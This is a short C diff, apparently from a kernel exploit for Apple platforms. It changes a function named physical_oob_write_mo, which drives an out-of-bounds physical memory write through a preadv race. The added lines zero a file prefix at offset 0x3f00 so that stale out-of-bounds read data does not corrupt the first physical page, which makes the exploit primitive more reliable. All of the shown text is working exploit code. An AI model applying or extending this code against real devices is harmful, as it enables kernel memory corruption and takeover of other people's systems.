@@ -541,6 +541,10 @@ void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObje
 	iov.iov_base = (void *)(pcAddress + 0x3f00);
 	iov.iov_len = offset + size;
 
+	// zero the file prefix at 0x3f00-0x3fff so old OOB read data doesn't
+	// corrupt the end of the first physical page during the preadv race
+	uint8_t zero_prefix[0x100] = {0};
+	pwrite(writeFd, zero_prefix, sizeof(zero_prefix), 0x3f00);
 	ssize_t pw = pwrite(writeFd, buffer, size, 0x3f00 + offset);
 	if (pw < 0) {
 		printf("[-] pwrite failed: errno=%d\n", errno);
